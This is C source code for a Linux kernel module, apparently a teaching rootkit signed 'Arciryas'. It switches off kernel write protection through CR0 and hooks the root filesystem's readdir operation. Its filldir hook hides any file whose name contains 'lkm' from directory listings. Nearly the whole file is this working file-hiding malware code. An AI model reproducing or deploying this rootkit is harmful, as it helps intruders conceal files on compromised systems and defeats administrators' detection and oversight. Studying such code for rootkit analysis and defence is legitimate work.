/*lkm4.c*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/file.h>

char *protect_filename = "lkm";
char *root_fs="/";

typedef int (*readdir_t)(struct file *, void *, filldir_t);
static int (*orig_filldir)(void *__buf, const char *name, int namelen,
			loff_t offset, u64 ino, unsigned int d_type);

readdir_t orig_readdir = NULL;

static int fake_filldir(void *__buff, const char *name, int namelen,
			loff_t offset, u64 ino, unsigned int d_type)
{
	char *get_protect = "lkm";
	
	if (strstr(name, get_protect))
		return 0;
	
	return orig_filldir(__buff, name, namelen, offset, ino, d_type);
}

int fake_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r;
	orig_filldir = filldir;
	
	printk("Arciryas:we are in the VFS layer!\n");
	
	r = orig_readdir(fp, buf, &fake_filldir);
	return r;
}

int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep;
	struct file_operations *new_op;

	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if(IS_ERR(filep))
		return -1;
	if(orig_readdir)
		*orig_readdir = filep->f_op->readdir;

	new_op = (struct file_operations *)filep->f_op;
	new_op->readdir = new_readdir;
	filep->f_op = new_op;
	
	filp_close(filep, 0);
	
	return 0;
}

int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
	struct file *filep;
	struct file_operations *new_op;

	filep = filp_open(p, O_RDONLY, 0);
	if(IS_ERR(filep))
		return -1;
	
	new_op = (struct file_operations *)filep->f_op;
	new_op->readdir = orig_readdir;
	
	filp_close(filep, 0);
	
	return 0;
}

static int lkm_init(void)
{
	write_cr0(read_cr0() & (~0x10000));
	printk("Arciyas:module loaded\n");
	patch_vfs(root_fs, &orig_readdir, fake_readdir);
	write_cr0(read_cr0() | 0x10000);
	return 0;
}

static void lkm_exit(void)
{
 	write_cr0(read_cr0() & (~0x10000));
	printk("Arciryas:module removed\n");
	unpatch_vfs(root_fs, orig_readdir);
 	write_cr0(read_cr0() | 0x10000);

}

module_init(lkm_init);
module_exit(lkm_exit);

